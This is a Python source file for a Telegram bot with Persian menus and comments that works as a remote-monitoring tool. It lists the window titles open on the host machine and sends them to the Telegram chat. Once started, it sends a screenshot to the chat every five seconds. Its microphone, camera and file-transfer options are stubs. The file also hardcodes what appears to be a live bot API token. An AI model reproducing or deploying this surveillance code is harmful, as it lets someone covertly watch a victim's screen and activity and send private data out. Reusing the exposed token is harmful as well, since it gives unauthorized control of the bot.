import telebot
from flask import Flask, request
import psutil
import os
import subprocess
import pyautogui
import threading
import time

API_TOKEN = '8104189481:AAHeedHcOE55SbQztotuYS9aFGmtR5OjLLQ'
bot = telebot.TeleBot(API_TOKEN)

# راه‌اندازی سرور Flask
app = Flask(__name__)

# دکمه های اصلی
def main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row('مشاهده فعالیت‌ها', 'کنترل میکروفون و دوربین')
    markup.row('ارسال فایل به گوشی', 'دریافت فایل از گوشی')
    markup.row('شروع اسکرین‌شات', 'متوقف کردن اسکرین‌شات')
    return markup

# شروع ربات
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "سلام! چه کاری می‌خواهید انجام دهید؟", reply_markup=main_menu())

# مشاهده فعالیت‌ها
@bot.message_handler(regexp="مشاهده فعالیت‌ها")
def check_activity(message):
    bot.reply_to(message, "در حال جمع‌آوری اطلاعات...")
    
    # به دست آوردن نام برنامه‌های در حال اجرا
    active_windows = subprocess.check_output("powershell Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object MainWindowTitle", shell=True)
    
    # تبدیل خروجی به لیست و فرمت‌بندی
    active_windows_list = active_windows.decode('utf-8').splitlines()
    active_windows_list = [window.strip() for window in active_windows_list if window.strip()]  # حذف خط‌های خالی

    if active_windows_list:
        response_message = "برنامه‌های در حال اجرا:\n\n" + "\n".join(f"• {window}" for window in active_windows_list)
    else:
        response_message = "هیچ برنامه‌ای در حال اجرا نیست."

    bot.send_message(message.chat.id, response_message)


# کنترل میکروفون و دوربین
@bot.message_handler(regexp="کنترل میکروفون و دوربین")
def control_mic_camera(message):
    bot.reply_to(message, "میکروفون و دوربین در حال کنترل هستند.")
    # به عنوان مثال: اضافه کردن کد برای کنترل میکروفون و دوربین

# ارسال فایل به گوشی
@bot.message_handler(regexp="ارسال فایل به گوشی")
def send_file_to_phone(message):
    bot.reply_to(message, "فایل مورد نظر را ارسال کنید:")

# دریافت فایل از گوشی
@bot.message_handler(regexp="دریافت فایل از گوشی")
def get_file_from_phone(message):
    bot.reply_to(message, "لطفاً فایلی که می‌خواهید ارسال کنید را انتخاب کنید:")

# شروع اسکرین‌شات
screenshot_active = False

def take_screenshot(chat_id):
    global screenshot_active
    while screenshot_active:
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(chat_id, photo)
        time.sleep(5)

@bot.message_handler(regexp="شروع اسکرین‌شات")
def start_screenshot(message):
    global screenshot_active
    if not screenshot_active:
        screenshot_active = True
        bot.reply_to(message, "در حال گرفتن اسکرین‌شات هر 5 ثانیه...")
        threading.Thread(target=take_screenshot, args=(message.chat.id,)).start()
    else:
        bot.reply_to(message, "اسکرین‌شات در حال حاضر فعال است.")

@bot.message_handler(regexp="متوقف کردن اسکرین‌شات")
def stop_screenshot(message):
    global screenshot_active
    if screenshot_active:
        screenshot_active = False
        bot.reply_to(message, "اسکرین‌شات متوقف شد.")
    else:
        bot.reply_to(message, "اسکرین‌شات در حال حاضر غیرفعال است.")

# راه‌اندازی سرور برای دریافت پیام‌ها از تلگرام
@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    bot.process_new_updates([telebot.types.Update.de_json(update)])
    return '', 200

# راه‌اندازی ربات با استفاده از webhook
def set_webhook():
    bot.remove_webhook()  # حذف وب‌هوک قبلی (اگر وجود داشته باشد)
    bot.set_webhook(url='https://web-production-f0db.up.railway.app/webhook')


if __name__ == '__main__':
    set_webhook()  # تنظیم وب‌هوک
    app.run(host='0.0.0.0', port=5000)  # راه‌اندازی سرور Flask
